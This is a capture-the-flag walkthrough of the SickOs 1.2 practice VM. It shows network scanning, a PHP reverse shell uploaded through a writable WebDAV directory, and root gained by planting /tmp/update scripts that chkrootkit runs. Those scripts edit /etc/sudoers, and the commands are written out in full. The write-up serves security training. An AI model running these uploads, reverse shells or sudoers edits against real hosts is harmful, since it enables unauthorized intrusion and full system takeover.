Reconnaissance:

Started by finding the host on the network.

nmap -sS -O 192.168.118.0/24

192.168.118.178 looks guilty.

Enumeration:

Now that I've found the host it is time to check what is open.

root@kali:~# nmap -A -T4 192.168.118.178

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-18 22:56 EDT
Nmap scan report for 192.168.118.178
Host is up (0.00058s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:44:B3:B9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.2, Linux 3.16 - 4.6, Linux 3.2 - 4.6, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 192.168.118.178

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds


root@kali:~# dirb http://192.168.118.178

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu May 18 22:57:27 2017
URL_BASE: http://192.168.118.178/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.118.178/ ----
+ http://192.168.118.178/index.php (CODE:200|SIZE:163)                                                                 
==> DIRECTORY: http://192.168.118.178/test/                                                                            

---- Entering directory: http://192.168.118.178/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Thu May 18 22:57:30 2017
DOWNLOADED: 4612 - FOUND: 1

root@kali:~# nmap --script http-methods -p 80 192.168.118.178

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-18 22:58 EDT
Nmap scan report for 192.168.118.178
Host is up (0.00052s latency).
PORT   STATE SERVICE
80/tcp open  http
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 00:0C:29:44:B3:B9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds

Almost helpful...but lets poke at that test directory more.

root@kali:~# curl -X OPTIONS -v http://192.168.118.178/test/
*   Trying 192.168.118.178...
* TCP_NODELAY set
* Connected to 192.168.118.178 (192.168.118.178) port 80 (#0)
> OPTIONS /test/ HTTP/1.1
> Host: 192.168.118.178
> User-Agent: curl/7.52.1
> Accept: */*
>
< HTTP/1.1 200 OK
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Allow: OPTIONS, GET, HEAD, POST
< Content-Length: 0
< Date: Fri, 19 May 2017 09:04:51 GMT
< Server: lighttpd/1.4.28
<
* Curl_http_done: called premature == 0
* Connection #0 to host 192.168.118.178 left intact
root@kali:~#

PUT.....I like that :)  dirb was nice enough to show us index.php, so how about a reverse php shell.  Sounds like fun.

http://pentestmonkey.net/tools/web-shells/php-reverse-shell

Change the IP in the script to my machines ip and the port to 4234.

root@kali:~/Downloads/php-reverse-shell-1.0/php-reverse-shell-1.0# curl http://192.168.118.178/test/ --upload-file php-reverse-shell.php

417 - Expectation Failed....hmm....off to Google!

root@kali:~/Downloads/php-reverse-shell-1.0/php-reverse-shell-1.0# curl -v -H "Expect:" -T "php-reverse-shell.php" http://192.168.118.178/test/

Thank you google!  Now....to run the PHP script from a web browser and watch netcat.  Or....nothing in netcat.  Maybe the sysadmin doesn't know how to configure lighttpd....but knows outbound filtering.  I'm going to change the port of the reverse shell to 443.

root@kali:~/Downloads/php-reverse-shell-1.0/php-reverse-shell-1.0# curl -v -H "Expect:" -T "php-reverse-shell-443.php" http://192.168.118.178/test/

HA!  That looks better!

$ whoami
www-data

Now...lets see what is installed.

$ dpkg --get-selections | grep deinstall
chkrootkit					deinstall

One package......

$ dpkg -s chkrootkit
Package: chkrootkit
Status: deinstall ok config-files
Priority: optional
Section: misc
Installed-Size: 915
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Architecture: i386
Version: 0.49-4ubuntu1.1
Config-Version: 0.49-4ubuntu1.1
Depends: libc6 (>= 2.7), debconf (>= 0.5) | debconf-2.0, binutils, net-tools, debconf, procps
Conffiles:
 /etc/cron.daily/chkrootkit f1aad4f9042a8595e68e7ecfde1c10f6
Description: rootkit detector
 The chkrootkit security scanner searches the local system for signs
 that it is infected with a 'rootkit'. Rootkits are set of programs
 and hacks designed to take control of a target machine by using known
 security flaws.
 .
 Types that chkrootkit can identify are listed on the project's home page.
 .
 Please note that where chkrootkit detects no intrusions, this does
 not guarantee that the system is uncompromised. In addition to
 running chkrootkit, more specific tests should always be performed.
Homepage: http://www.chkrootkit.org/
Original-Maintainer: Giuseppe Iuculano <iuculano@debian.org>
$

https://www.exploit-db.com/exploits/33899/

Thanks Google!  Maybe we can add the www-data user to the sudo users

$ cd /tmp
$ echo "#!/bin/sh\nusermod -aG sudo www-data"
#!/bin/sh
usermod -aG sudo www-data
$ echo "#!/bin/sh\nusermod -aG sudo www-data" > update
$ chmod 777 update
$ ls -l
total 16
drwxrwxrwt 2 root     root     4096 May 18 13:46 VMwareDnD
srwxr-xr-x 1 www-data www-data    0 May 18 13:46 php.socket-0
-rwxrwxrwx 1 www-data www-data   36 May 19 02:48 update
-rw-r--r-- 1 root     root     1600 May 18 19:46 vgauthsvclog.txt.0
drwx------ 2 root     root     4096 May 18 13:46 vmware-root
$

And wait....

$ echo "touch /tmp/update-ran.txt" >> /tmp/update
$ cat /tmp/update
#!/bin/sh
usermod -aG sudo www-data
touch /tmp/update-ran.txt

Make sure that the update file ran and there isn't a problem with my sudo add.

$ ls
VMwareDnD
php.socket-0
update
update-ran.txt
vgauthsvclog.txt.0
vmware-root

Restarted the shell...

$ sudo su
sudo: no tty present and no askpass program specified
Sorry, try again.
sudo: no tty present and no askpass program specified
Sorry, try again.
sudo: no tty present and no askpass program specified
Sorry, try again.
sudo: 3 incorrect password attempts

No go...lets try something else..

$ echo '#!/bin/sh\necho "www-data ALL=(ALL) ALL" >> /etc/sudoers' >> update2
$ cat update2
#!/bin/sh
echo "www-data ALL=(ALL) ALL" >> /etc/sudoers

$ echo "touch /tmp/update2-ran.txt" >> /tmp/update2
$ cat update2
#!/bin/sh
echo "www-data ALL=(ALL) ALL" >> /etc/sudoers
touch /tmp/update2-ran.txt
$ mv update update.old
$ mv update2 update

And time to wait again.

$ ls
VMwareDnD
php.socket-0
update
update-ran.txt
update.old
update2-ran.txt
vgauthsvclog.txt.0
vmware-root

still not working.....time to possibly break stuff

$ echo "chmod 777 /etc/sudoers" > update

Looks like my format was wrong....going to try and fix it...maybe i didn't kill the sudoers file...

$ echo 'echo "www-data	ALL=(ALL:ALL) ALL" >> /etc/sudoers' > /tmp/update

$ sudo su
sudo: /etc/sudoers is mode 0777, should be 0440
sudo: no valid sudoers sources found, quitting
sudo: unable to initialize policy plugin

ok, lets fix that

$ echo "chmod 0440 /etc/sudoers" > /tmp/update

still no go, probably broke the sudoers file...one more shot

$ echo 'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers'

restart my shell....

$ sudo su
whoami
root

huzaah!  Turns out i'm not great with sudoers format...and it is harder to break the file than i orginally guessed.

cd /root
ls
304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz
7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
chkrootkit-0.49
newRule
cat /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
